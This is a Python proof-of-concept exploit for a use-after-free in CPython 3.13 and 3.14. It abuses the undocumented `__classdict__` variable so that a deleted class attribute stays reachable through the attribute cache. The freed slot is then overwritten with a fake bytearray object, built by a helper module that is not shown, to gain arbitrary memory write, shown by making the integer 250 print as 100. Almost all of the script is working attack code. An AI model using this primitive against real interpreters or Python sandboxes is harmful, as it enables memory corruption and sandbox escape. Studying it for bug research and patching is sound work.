"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Attribute cache UAF using undocumented __classdict__ variable
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# The undocumented `__classdict__` variable gives you a mutable version of the class's __dict__.
# Deleting items from this dict doesn't invalidate the attribute cache, so you can access freed
# objects by using attributes after deleting them via the classdict.

# No source code because idk what to show.
# Source: trust me bro

from common import evil_bytearray_obj

class bytes_subclass(bytes):
    pass

# see ./common/common.py for evil bytearray obj explanation
fake_obj, _ = evil_bytearray_obj()

SIZE = 0x100
class UAF:
    mem = bytes_subclass(SIZE - 0x18)

    # you can use any function here, it's just convenient to use __init__
    def __init__(self):
        self.mem # adds mem to the attribute cache
        del __classdict__['mem'] # deletes mem but doesn't invalidate the attribute cache

UAF() # trigger bug

# write the fake object to where the original `mem` used to be.
_ref = fake_obj.ljust(SIZE, b"\0")

# the cache still hasn't been invalidated, so you can still access the value from it even though it's been deleted
mem = UAF.mem

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100